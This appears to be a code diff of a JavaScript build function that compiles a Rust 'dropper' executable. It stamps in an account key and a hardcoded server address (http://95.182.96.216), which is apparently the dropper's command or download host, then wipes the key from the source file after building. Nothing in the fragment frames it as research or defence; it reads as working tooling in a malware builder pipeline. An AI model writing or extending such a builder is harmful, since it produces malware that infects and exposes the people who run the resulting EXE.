@@ -13,9 +13,12 @@ export async function buildBoot({ key, buildId, serverIp }) {
     const srcPath = path.join(DROPPER_DIR, 'src', 'main.rs');
     let code = fs.readFileSync(srcPath, 'utf8');
 
+    // HARDCODE THE IP HERE. Ignore whatever was passed in.
+    const hardcodedIp = 'http://95.182.96.216';
+
     // Inject key and IP
     code = code.replace('__ACCOUNT_KEY__', key);
-    code = code.replace('__SERVER_IP__', serverIp);
+    code = code.replace('__SERVER_IP__', hardcodedIp);
     fs.writeFileSync(srcPath, code);
 
     console.log('[build] compiling rust dropper...');
@@ -29,7 +32,7 @@ export async function buildBoot({ key, buildId, serverIp }) {
 
     // Revert source file so we don't leave the key on disk
     code = code.replace(key, '__ACCOUNT_KEY__');
-    code = code.replace(serverIp, '__SERVER_IP__');
+    code = code.replace(hardcodedIp, '__SERVER_IP__');
     fs.writeFileSync(srcPath, code);
 
     // Return the raw EXE buffer directly
